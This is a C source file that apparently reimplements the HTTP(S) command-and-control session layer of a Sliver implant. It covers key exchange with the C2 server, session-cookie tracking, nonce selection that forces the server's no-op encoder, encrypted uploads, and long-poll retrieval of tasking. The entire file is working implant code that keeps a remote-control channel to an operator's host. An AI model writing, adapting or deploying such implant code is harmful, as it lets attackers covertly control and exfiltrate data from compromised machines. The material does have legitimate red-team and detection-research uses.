/* src/transport/http_session.c - Sliver HTTP(S) C2 session layer (H3).
 *
 * The real listener does not accept bare envelopes: it authenticates a session
 * cookie, decodes the body with a nonce-selected encoder and decrypts it with the
 * session's CipherContext. This module implements that conversation; the
 * primitives come from H1/H2.
 *
 *   establish: HTTPSSessionInit{Key} -> age key exchange -> POST -> 200
 *              -> remember Set-Cookie (name is random per response, see
 *                 server/c2/http.go getCookieName)
 *   send     : POST encode(cipher(envelope))      -> 202 Accepted
 *   recv     : GET  (cookie) -> 200 decode(cipher(body)) | 204 idle | 403 stale
 *   close    : drop the cookie
 *
 * We always pick a nonce that is a multiple of 65537, so the server selects
 * NoEncoder (EncoderFromNonce id 0) and the encoder step is the identity.
 */
#include "sliver/http_session.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/config.h"
#include "sliver/crypto.h"
#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"
#include "sliver/transport.h"

#define HTTP_SESSION_RECV_TIMEOUT_MS 15000
#define HTTP_SESSION_MAX_RESPONSE (8u * 1024u * 1024u)

int sliver_http_session_init(sliver_http_session_t *s, const char *host, uint16_t port,
                             int use_tls, const char *base_path) {
  if (s == NULL || host == NULL) {
    return -1;
  }
  memset(s, 0, sizeof(*s));
  (void)snprintf(s->host, sizeof(s->host), "%s", host);
  s->port = port;
  s->use_tls = use_tls;
  (void)snprintf(s->base_path, sizeof(s->base_path), "%s",
                 base_path != NULL && base_path[0] != '\0' ? base_path : "/");
  s->poll_timeout_ns = sliver_config_poll_timeout_ns();
  if (s->poll_timeout_ns <= 0) {
    /* Default so an idle poll does not spin: the listener answers 204 at once
     * when it has nothing queued, and without a non-zero timeout the session
     * loop would issue thousands of requests per minute. */
    s->poll_timeout_ns = 5000000000LL;
  }
  return 0;
}

/* --- minimal HTTP exchange ---------------------------------------------- */
/* The listener derives the encoder from a nonce carried in the URL
 * (server/c2/http.go getNoncesFromURL: query values or path segments that parse
 * as uint64). Without one it answers 404 with ErrMissingNonce. We always emit a
 * nonce that is a multiple of 65537 so EncoderFromNonce selects id 0
 * (NoEncoder), and use a one-character query key because the authenticated
 * lookup matches keys whose length equals ImplantConfig.NonceQueryLength (1 in
 * the default profile). */
static void session_target(sliver_http_session_t *s, char *out, size_t cap) {
  sliver_http_c2_t prof;
  const char *chars = "abcdefghijklmnopqrstuvwxyz";
  char key = 'a';
  unsigned long long nonce = 0;
  memset(&prof, 0, sizeof(prof));
  if (sliver_config_http_c2(&prof) == 1 && prof.nonce_query_arg_chars != NULL &&
      prof.nonce_query_arg_chars[0] != '\0') {
    chars = prof.nonce_query_arg_chars;
  }
  if (sliver_encoder_pick_nonce(SLIVER_ENCODER_NOP, &nonce) == 0 && nonce != 0) {
    key = chars[nonce % strlen(chars)];
  }
  if (nonce == 0) {
    nonce = 65537ull;
  }
  (void)snprintf(out, cap, "%s%c%c=%llu", s->base_path,
                 strchr(s->base_path, '?') != NULL ? '&' : '?', key, nonce);
}
int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
                                 const char *path, const void *body, size_t body_len,
                                 int *status_out, unsigned char **resp_body,
                                 size_t *resp_len) {
  sliver_socket_t *sock = NULL;
  sliver_tls_t *tls = NULL;
  char head[1024];
  char target[768];
  char errbuf[256];
  int head_len;
  size_t sent = 0;
  unsigned char *buf = NULL;
  size_t total = 0;
  size_t cap = 0;

  if (status_out != NULL) {
    *status_out = 0;
  }
  if (resp_body != NULL) {
    *resp_body = NULL;
  }
  if (resp_len != NULL) {
    *resp_len = 0;
  }

  session_target(s, target, sizeof(target));
  {
    /* Long poll: a GET waits up to poll_timeout; a POST must not. */
    int timeout_ms = HTTP_SESSION_RECV_TIMEOUT_MS;
    if (s->poll_timeout_ns > 0 && method != NULL && strcmp(method, "GET") == 0) {
      long long ms = s->poll_timeout_ns / 1000000LL;
      if (ms > 0 && ms < 120000) {
        timeout_ms = (int)ms;
      }
    }
    s->timeout_ms = timeout_ms;
  }

  if (s->use_tls) {
    errbuf[0] = '\0';
    if (sliver_tls_connect_plain(&tls, s->host, s->port, errbuf, sizeof(errbuf)) != 0) {
      LOG_WARN("http-c2: tls connect failed: %s", errbuf);
      return -1;
    }
  } else {
    sock = sliver_tcp_connect(s->host, s->port);
    if (sock == NULL) {
      LOG_WARN("http-c2: cannot connect to %s:%u", s->host, (unsigned)s->port);
      return -1;
    }
    sliver_socket_set_recv_timeout(sock, s->timeout_ms);
    sliver_socket_set_send_timeout(sock, HTTP_SESSION_RECV_TIMEOUT_MS);
  }

  head_len = snprintf(head, sizeof(head),
                      "%s %s HTTP/1.1\r\n"
                      "Host: %s:%u\r\n"
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %u\r\n"
                      "Connection: close\r\n"
                      "%s%s%s"
                      "\r\n",
                      method, target, s->host, (unsigned)s->port,
                      (unsigned)body_len, s->have_cookie ? "Cookie: " : "",
                      s->have_cookie ? s->cookie_name : "", s->have_cookie ? "" : "");
  if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
    goto fail;
  }
  if (s->have_cookie) {
    /* Rebuild the header with the cookie value (kept separate for clarity). */
    head_len = snprintf(head, sizeof(head),
                        "%s %s HTTP/1.1\r\n"
                        "Host: %s:%u\r\n"
                        "Content-Type: application/octet-stream\r\n"
                        "Content-Length: %u\r\n"
                        "Connection: close\r\n"
                        "Cookie: %s=%s\r\n"
                        "\r\n",
                        method, target, s->host, (unsigned)s->port,
                        (unsigned)body_len, s->cookie_name, s->cookie_value);
    if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
      goto fail;
    }
  }
  while (sent < (size_t)head_len) {
    long n = tls != NULL ? sliver_tls_write(tls, head + sent, (size_t)head_len - sent)
                         : sliver_socket_send(sock, head + sent, (size_t)head_len - sent);
    if (n <= 0) {
      goto fail;
    }
    sent += (size_t)n;
  }
  sent = 0;
  while (body_len != 0 && sent < body_len) {
    long n = tls != NULL
                 ? sliver_tls_write(tls, (const unsigned char *)body + sent, body_len - sent)
                 : sliver_socket_send(sock, (const unsigned char *)body + sent,
                                      body_len - sent);
    if (n <= 0) {
      goto fail;
    }
    sent += (size_t)n;
  }

  for (;;) {
    long n;
    if (total + 4096 > cap) {
      size_t want = cap == 0 ? 8192 : cap * 2;
      unsigned char *grown;
      if (want > HTTP_SESSION_MAX_RESPONSE) {
        break;
      }
      grown = (unsigned char *)realloc(buf, want);
      if (grown == NULL) {
        goto fail;
      }
      buf = grown;
      cap = want;
    }
    n = tls != NULL ? sliver_tls_read(tls, buf + total, cap - total)
                    : sliver_socket_recv(sock, buf + total, cap - total);
    if (n <= 0) {
      break;
    }
    total += (size_t)n;
  }

  if (tls != NULL) {
    sliver_tls_close(tls);
  }
  if (sock != NULL) {
    sliver_socket_close(sock);
  }

  if (total == 0 || buf == NULL) {
    /* No response at all (long-poll timeout): status 0 lets the caller treat it
     * as idle instead of a failure. */
    free(buf);
    if (status_out != NULL) {
      *status_out = 0;
    }
    return 0;
  }
  {
    const unsigned char *sep = NULL;
    size_t i;
    size_t header_len;
    for (i = 3; i < total; ++i) {
      if (buf[i - 3] == '\r' && buf[i - 2] == '\n' && buf[i - 1] == '\r' && buf[i] == '\n') {
        sep = buf + i + 1;
        break;
      }
    }
    if (sep == NULL) {
      free(buf);
      return -1;
    }
    header_len = (size_t)(sep - buf);
    if (status_out != NULL && header_len >= 12 && memcmp(buf, "HTTP/1.", 7) == 0) {
      *status_out = (buf[9] - '0') * 100 + (buf[10] - '0') * 10 + (buf[11] - '0');
    }
    /* Always track the latest cookie: the listener rotates the NAME on every\n     * response (getCookieName picks from the profile), only the value is\n     * stable. */
    {
      const char *hdr = (const char *)buf;
      const char *cookie = strstr(hdr, "Set-Cookie: ");
      if (cookie != NULL && (size_t)(cookie - hdr) < header_len) {
        const char *eq = strchr(cookie, '=');
        if (eq != NULL) {
          size_t name_len = (size_t)(eq - (cookie + 12));
          const char *end = strchr(eq + 1, ';');
          size_t value_len = end != NULL ? (size_t)(end - (eq + 1)) : strlen(eq + 1);
          if (name_len < sizeof(s->cookie_name) && value_len < sizeof(s->cookie_value)) {
            memcpy(s->cookie_name, cookie + 12, name_len);
            s->cookie_name[name_len] = '\0';
            memcpy(s->cookie_value, eq + 1, value_len);
            s->cookie_value[value_len] = '\0';
            s->have_cookie = 1;
            LOG_DEBUG("http-c2: session cookie %s (%u bytes)", s->cookie_name,
                      (unsigned)value_len);
          }
        }
      }
    }
    if (resp_body != NULL) {
      size_t body_size = total - header_len;
      if (body_size != 0) {
        *resp_body = (unsigned char *)malloc(body_size);
        if (*resp_body == NULL) {
          free(buf);
          return -1;
        }
        memcpy(*resp_body, sep, body_size);
        if (resp_len != NULL) {
          *resp_len = body_size;
        }
      }
    }
  }
  free(buf);
  return 0;

fail:
  if (tls != NULL) {
    sliver_tls_close(tls);
  }
  if (sock != NULL) {
    sliver_socket_close(sock);
  }
  free(buf);
  return -1;
}

/* --- session protocol ---------------------------------------------------- */
int sliver_http_session_establish(sliver_http_session_t *s) {
  unsigned char key[SLIVER_CHACHAPOLY_KEY_LEN];
  sliver_buf_t init;
  unsigned char *init_plain = NULL;
  size_t init_plain_len = 0;
  unsigned char *wrapped = NULL;
  size_t wrapped_len = 0;
  unsigned char *encoded = NULL;
  size_t encoded_len = 0;
  unsigned char *resp = NULL;
  size_t resp_len = 0;
  char path[600];
  int status = 0;
  int rc = -1;

  if (s == NULL) {
    return -1;
  }
  if (sliver_random_bytes(key, sizeof(key)) != 0) {
    return -1;
  }
  /* HTTPSessionInit{ Key = 1 } */
  sliver_buf_init(&init);
  if (sliver_buf_put_bytes(&init, 1, key, sizeof(key)) != 0) {
    return -1;
  }
  init_plain = (unsigned char *)init.data;
  init_plain_len = init.len;

  if (sliver_age_keyex_to_server_config(init_plain, init_plain_len, &wrapped,
                                       &wrapped_len) != 0) {
    LOG_WARN("http-c2: age key exchange failed (are the age secrets injected?)");
    goto done;
  }
  if (sliver_encoder_encode(SLIVER_ENCODER_NOP, wrapped, wrapped_len, &encoded,
                            &encoded_len) != 0) {
    goto done;
  }

  (void)snprintf(path, sizeof(path), "%s", s->base_path);
  if (sliver_http_session_exchange(s, "POST", path, encoded, encoded_len, &status, &resp,
                                  &resp_len) != 0) {
    goto done;
  }
  if (status != 200) {
    LOG_WARN("http-c2: session init rejected (status %d)", status);
    goto done;
  }
  if (!s->have_cookie) {
    LOG_WARN("http-c2: session init returned no cookie");
    goto done;
  }
  memcpy(s->key, key, sizeof(key));
  s->established = 1;
  rc = 0;

done:
  sliver_buf_free(&init);
  free(wrapped);
  free(encoded);
  free(resp);
  return rc;
}

int sliver_http_session_send(sliver_http_session_t *s, const void *envelope, size_t len) {
  unsigned char *cipher = NULL;
  size_t cipher_len = 0;
  unsigned char *encoded = NULL;
  size_t encoded_len = 0;
  int status = 0;

  if (s == NULL || !s->established) {
    return -1;
  }
  if (sliver_cipher_encrypt(s->key, envelope, len, &cipher, &cipher_len) != 0) {
    return -1;
  }
  if (sliver_encoder_encode(SLIVER_ENCODER_NOP, cipher, cipher_len, &encoded,
                            &encoded_len) != 0) {
    free(cipher);
    return -1;
  }
  free(cipher);
  {
    int rc = sliver_http_session_exchange(s, "POST", s->base_path, encoded, encoded_len,
                                         &status, NULL, NULL);
    free(encoded);
    if (rc != 0) {
      return -1;
    }
  }
  /* The listener answers 202 Accepted, 204 when it has nothing to say. */
  if (status != 202 && status != 204) {
    LOG_WARN("http-c2: send rejected (status %d)", status);
    return -1;
  }
  return 0;
}

int sliver_http_session_recv(sliver_http_session_t *s, sliver_buf_t *env_out) {
  unsigned char *resp = NULL;
  size_t resp_len = 0;
  int status = 0;
  int rc;

  if (env_out == NULL) {
    return -1;
  }
  sliver_buf_init(env_out);
  if (s == NULL || !s->established) {
    return -1;
  }
  rc = sliver_http_session_exchange(s, "GET", s->base_path, NULL, 0, &status, &resp,
                                   &resp_len);
  if (rc != 0) {
    return -1;
  }
  LOG_DEBUG("http-c2: poll status %d (%u bytes)", status, (unsigned)resp_len);
  if (status == 0) {
    free(resp);
    return 1; /* long-poll timed out with nothing queued: idle */
  }
  if (status == 204) {
    free(resp);
    return 1; /* idle: nothing to do, keep the loop alive */
  }
  if (status == 403) {
    free(resp);
    LOG_WARN("http-c2: session expired (403)");
    s->established = 0;
    s->have_cookie = 0;
    return -1;
  }
  if (status != 200 || resp_len == 0) {
    free(resp);
    return -1;
  }
  {
    unsigned char *decoded = NULL;
    size_t decoded_len = 0;
    if (sliver_encoder_decode(SLIVER_ENCODER_NOP, resp, resp_len, &decoded, &decoded_len) !=
        0) {
      LOG_WARN("http-c2: poll body failed to decode");
      free(resp);
      return -1;
    }
    free(resp);
    rc = sliver_cipher_decrypt(s->key, decoded, decoded_len, &env_out->data, &env_out->len);
    if (rc != 0) {
      /* Server payloads look like cryptography.CipherContext.Decrypt inputs: a
       * 74 byte minisign header followed by nonce||AEAD (that function strips
       * exactly 74 bytes before decrypting). Retry past the signature. */
      const size_t k_sig_len = 74;
      if (decoded_len > k_sig_len + 12 + 16) {
        rc = sliver_cipher_decrypt(s->key, decoded + k_sig_len, decoded_len - k_sig_len,
                                   &env_out->data, &env_out->len);
        if (rc == 0) {
          LOG_DEBUG("http-c2: poll body decrypted after skipping the %u byte signature",
                    (unsigned)k_sig_len);
        } else {
          LOG_WARN("http-c2: poll body failed to decrypt (%u bytes, also after the signature)",
                   (unsigned)decoded_len);
        }
      } else {
        LOG_WARN("http-c2: poll body failed to decrypt (%u bytes)", (unsigned)decoded_len);
      }
    }
    free(decoded);
    return rc == 0 ? 0 : -1;
  }
}

void sliver_http_session_close(sliver_http_session_t *s) {
  if (s == NULL) {
    return;
  }
  s->established = 0;
  s->have_cookie = 0;
  s->cookie_name[0] = '\0';
  s->cookie_value[0] = '\0';
  sliver_secure_zero(s->key, sizeof(s->key));
}
